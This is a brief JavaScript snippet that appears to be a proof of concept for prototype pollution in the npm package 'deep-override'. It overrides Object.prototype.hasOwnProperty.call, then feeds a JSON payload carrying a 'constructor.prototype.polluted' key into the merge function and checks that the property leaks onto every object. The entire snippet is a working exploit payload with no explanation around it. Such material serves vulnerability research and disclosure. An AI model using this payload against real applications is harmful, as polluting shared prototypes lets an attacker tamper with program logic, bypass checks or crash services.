Object.prototype.hasOwnProperty.call = () => true;
console.log({}.polluted);
const deepOverride = require('deep-override');
deepOverride({}, JSON.parse('{"constructor": {"prototype": {"polluted":"yes"}}}'));
console.log({}.polluted);